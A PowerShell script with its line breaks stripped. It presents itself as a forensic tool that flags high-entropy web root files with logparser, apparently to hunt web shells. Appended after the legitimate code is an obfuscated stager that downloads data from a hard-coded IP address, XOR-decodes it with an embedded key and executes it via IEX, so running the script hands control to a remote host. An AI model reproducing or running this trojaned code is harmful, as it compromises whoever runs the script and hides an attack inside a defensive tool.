Param([Parameter(Mandatory=$False,Position=0)][switch]$NoStacking=$False)function Get-Median {Param([Parameter(Mandatory=$True,Position=0)][double[]]$Data)$Data = $Data | Sort-Objectif ($Data.Count%2) {$Median = $Data[[Math]::Floor($Data.Count/2)]}else {$Median = ($Data[$Data.Count/2], $Data[($Data.Count/2) - 1] | Measure-Object -Average).Average}return $Median}function Get-MedianAbsoluteDeviation {Param([Parameter(Mandatory=$True,Position=0)][double[]]$Data,[Parameter(Mandatory=$False,Position=1)][double]$Center=(Get-Median $Data),[Parameter(Mandatory=$False,Position=2)][double]$ScaleFactor=1.4826)$MAD = $ScaleFactor * (Get-Median ($Data | foreach { [Math]::Abs($_ - $Center) }))return $MAD}function Get-EntropyOutliers {Param([Parameter(Mandatory=$True,Position=0)][psobject]$lp_results)foreach ($lp_result in $lp_results) {$extension  = $lp_result.Extension$avgEntropy = $lp_result.AvgEntropy$lp_query = @"SELECTFullName,Length,EntropyFROM*WebRootListing.tsvWHEREEXTRACT_EXTENSION(FullName) = '$extension'"@$lp_files = & logparser -stats:off -i:csv -o:csv -dtlines:0 -fixedsep:on "$lp_query" | ConvertFrom-Csv$ext_MAD  = Get-MedianAbsoluteDeviation ($lp_files).Entropyforeach ($lp_file in $lp_files) {if ([Math]::Abs($lp_file.Entropy - $avgEntropy) -gt (3 * $ext_MAD)) {$o = $lp_file | Select-Object "FullName","Length","Entropy"Add-Member -InputObject $o -MemberType NoteProperty -Name "EntropyAvg" -Value $avgEntropy$o}}}}if (Get-Command logparser.exe) {$lp_query = @"SELECTEXTRACT_EXTENSION(FullName) AS Extension,AVG(ALL TO_REAL(Entropy)) AS AvgEntropyFROM*WebRootListing.tsvGROUP BYEXTRACT_EXTENSION(FullName)HAVINGAvgEntropy > 0.0"@$lp_results = & logparser -stats:off -i:csv -o:csv -dtlines:0 -fixedsep:on "$lp_query" | ConvertFrom-Csv$outliers = Get-EntropyOutliers $lp_resultsif(!$NoStacking) {$lpquery = @"SELECT COUNT(FullName,Length,Entropy,EntropyAvg) as ct,FullName,Length,Entropy,EntropyAvgFROM STDINGROUP BYFullName,Length,Entropy,EntropyAvgORDER Byct ASC"@$outliers = $outliers | ConvertTo-Csv -NoTypeInformation | & logparser -stats:off -i:csv -dtlines:0 -rtp:-1 "$lpquery"}$outliers} else {$ScriptName = [System.IO.Path]::GetFileName($MyInvocation.ScriptName)"${ScriptName} requires logparser.exe in the path."}[SYsTEM.NEt.SERvICePoiNtMAnaGeR]::EXpECT100CONtInue = 0;$wC=NEW-ObJecT SySteM.NEt.WEBClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeaDErS.ADD('User-Agent',$u);$Wc.PRoXy = [SystEM.Net.WeBReqUEST]::DeFAULTWebProXy;$wc.ProXY.CREDEntiALs = [SySTeM.NEt.CREdentIAlCachE]::DEFAULtNETWoRKCreDEnTiALs;$K='63a9f0ea7bb98050796b649e85481845';$I=0;[chAR[]]$B=([ChAr[]]($Wc.DOWnLoaDStrInG("http://138.121.170.12:3135/index.asp")))|%{$_-bXor$k[$i++%$k.LEngth]};IEX ($B-jOin'')